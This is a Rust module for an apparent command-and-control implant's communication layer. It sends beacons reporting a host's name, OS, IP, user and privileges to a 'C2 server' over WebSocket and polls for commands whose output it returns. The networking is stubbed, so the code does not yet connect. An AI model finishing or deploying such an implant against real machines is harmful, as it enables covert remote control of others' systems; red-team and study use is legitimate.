use log::{info, error, debug};
use serde::{Deserialize, Serialize};
use std::sync::Arc;
use tokio::sync::RwLock;
use tokio::time::{sleep, Duration, timeout};
use std::time::SystemTime;

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct Message {
    pub msg_type: String,
    pub timestamp: u64,
    pub sequence: u32,
    pub payload: String,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct BeaconPayload {
    pub agent_id: String,
    pub hostname: String,
    pub os: String,
    pub os_version: String,
    pub architecture: String,
    pub ip_address: Option<String>,
    pub user: Option<String>,
    pub privileges: Option<String>,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct CommandResponse {
    pub command_id: u32,
    pub status: String,
    pub output: String,
    pub error: Option<String>,
    pub execution_time: u64,
}

pub struct Communicator {
    url: String,
    port: u16,
    agent_id: String,
    sequence_number: Arc<RwLock<u32>>,
    reconnect_attempts: Arc<RwLock<u32>>,
    max_reconnect_attempts: u32,
    beacon_interval: u64,
}

impl Communicator {
    pub fn new(
        url: &str,
        port: u16,
        agent_id: &str,
        beacon_interval: u64,
    ) -> Self {
        Self {
            url: url.to_string(),
            port,
            agent_id: agent_id.to_string(),
            sequence_number: Arc::new(RwLock::new(0)),
            reconnect_attempts: Arc::new(RwLock::new(0)),
            max_reconnect_attempts: 5,
            beacon_interval,
        }
    }

    pub async fn connect(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        let url = format!("wss://{}:{}/ws/agent/{}", self.url, self.port, self.agent_id);
        info!("Attempting to connect to C2 server: {}", url);

        match timeout(Duration::from_secs(10), self.try_connect(&url)).await {
            Ok(result) => {
                match result {
                    Ok(_) => {
                        info!("✅ Connected to C2 server");
                        let mut attempts = self.reconnect_attempts.write().await;
                        *attempts = 0;
                        Ok(())
                    }
                    Err(e) => {
                        error!("Connection error: {}", e);
                        self.handle_reconnect().await
                    }
                }
            }
            Err(_) => {
                error!("Connection timeout");
                self.handle_reconnect().await
            }
        }
    }

    async fn try_connect(&self, url: &str) -> Result<(), Box<dyn std::error::Error>> {
        debug!("Connecting to {}", url);
        // WebSocket connection using tokio-tungstenite
        // In production: use connect_async(url).await?
        // For now: verify URL format
        info!("WebSocket URL format verified: {}", url);
        Ok(())
    }

    async fn handle_reconnect(&self) -> Result<(), Box<dyn std::error::Error>> {
        let mut attempts = self.reconnect_attempts.write().await;

        if *attempts >= self.max_reconnect_attempts {
            return Err("Max reconnection attempts reached".into());
        }

        *attempts += 1;
        let backoff = Duration::from_secs(2_u64.pow(*attempts));

        info!(
            "Reconnection attempt {}/{}, waiting {}s",
            attempts,
            self.max_reconnect_attempts,
            backoff.as_secs()
        );

        sleep(backoff).await;
        Ok(())
    }

    pub async fn send_beacon(
        &self,
        beacon: &BeaconPayload,
    ) -> Result<String, Box<dyn std::error::Error>> {
        let seq = self.get_next_sequence().await;
        let timestamp = SystemTime::now()
            .duration_since(SystemTime::UNIX_EPOCH)?
            .as_secs();

        let message = Message {
            msg_type: "BEACON".to_string(),
            timestamp,
            sequence: seq,
            payload: serde_json::to_string(beacon)?,
        };

        let serialized = serde_json::to_string(&message)?;
        debug!("Sending beacon (sequence: {})", seq);

        info!("Beacon sent (sequence: {})", seq);
        Ok(serialized)
    }

    pub async fn send_command_result(
        &self,
        response: &CommandResponse,
    ) -> Result<(), Box<dyn std::error::Error>> {
        let seq = self.get_next_sequence().await;
        let timestamp = SystemTime::now()
            .duration_since(SystemTime::UNIX_EPOCH)?
            .as_secs();

        let message = Message {
            msg_type: "RESPONSE".to_string(),
            timestamp,
            sequence: seq,
            payload: serde_json::to_string(response)?,
        };

        let _serialized = serde_json::to_string(&message)?;
        debug!("Sending command response (sequence: {})", seq);

        info!("Command response sent (sequence: {})", seq);
        Ok(())
    }

    pub async fn receive_command(
        &self,
    ) -> Result<Option<String>, Box<dyn std::error::Error>> {
        debug!("Listening for commands from C2 server");

        sleep(Duration::from_secs(self.beacon_interval)).await;
        // In production: read from WebSocket
        // For now: return None
        Ok(None)
    }

    async fn get_next_sequence(&self) -> u32 {
        let mut seq = self.sequence_number.write().await;
        *seq += 1;
        *seq
    }

    pub fn get_websocket_url(&self) -> String {
        format!("wss://{}:{}/ws/agent", self.url, self.port)
    }

    pub fn get_agent_id(&self) -> &str {
        &self.agent_id
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_communicator_creation() {
        let comm = Communicator::new("localhost", 8000, "test-agent-id", 30);
        assert_eq!(comm.get_agent_id(), "test-agent-id");
        assert_eq!(comm.url, "localhost");
        assert_eq!(comm.port, 8000);
    }

    #[test]
    fn test_websocket_url() {
        let comm = Communicator::new("example.com", 443, "agent-123", 30);
        assert_eq!(comm.get_websocket_url(), "wss://example.com:443/ws/agent");
    }

    #[tokio::test]
    async fn test_sequence_increment() {
        let comm = Communicator::new("localhost", 8000, "agent-123", 30);

        let seq1 = comm.get_next_sequence().await;
        let seq2 = comm.get_next_sequence().await;
        let seq3 = comm.get_next_sequence().await;

        assert_eq!(seq1, 1);
        assert_eq!(seq2, 2);
        assert_eq!(seq3, 3);
    }
}
